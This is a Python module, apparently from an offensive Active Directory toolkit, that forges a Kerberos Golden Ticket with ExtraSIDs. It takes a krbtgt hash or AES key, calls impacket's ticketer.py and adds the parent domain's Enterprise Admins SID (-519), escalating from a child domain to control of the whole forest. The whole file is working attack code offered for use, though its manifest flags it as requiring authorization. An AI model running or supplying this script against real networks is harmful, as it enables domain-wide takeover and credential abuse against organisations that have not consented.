"""Golden Ticket + ExtraSIDs → Enterprise Admins no root domain."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.trust.extrasids.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge", "cross_domain_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1134.005"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)
    parent_domain = getattr(args, "parent_domain", None)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    child_sid = getattr(args, "child_sid", None)
    parent_sid = getattr(args, "parent_sid", None)

    print("[*] ExtraSIDs Trust Escalation: {} -> {}".format(cred.domain, parent_domain or "parent"))
    print("[*] Forging Golden Ticket with ExtraSIDs for Enterprise Admins")
    print("[*] Child SID: {}  Parent SID: {}".format(child_sid or "auto-detect", parent_sid or "auto-detect"))

    if not krbtgt_hash:
        print("[!] --krbtgt-hash required for ExtraSIDs ticket forging")
        return 1

    import subprocess
    import shutil
    ticketer = shutil.which("ticketer.py") or shutil.which("impacket-ticketer")
    if not ticketer:
        print("[!] ticketer.py (impacket) not found")
        return 1

    cmd = [
        ticketer, "-nthash", krbtgt_hash,
        "-domain", cred.domain,
        "-domain-sid", child_sid or "",
        "-extra-sid", (parent_sid or "") + "-519",
        "Administrator",
    ]
    aes_key = getattr(args, "aes_key", None)
    if aes_key:
        cmd = [ticketer, "-aesKey", aes_key, "-domain", cred.domain,
               "-domain-sid", child_sid or "",
               "-extra-sid", (parent_sid or "") + "-519",
               "Administrator"]

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
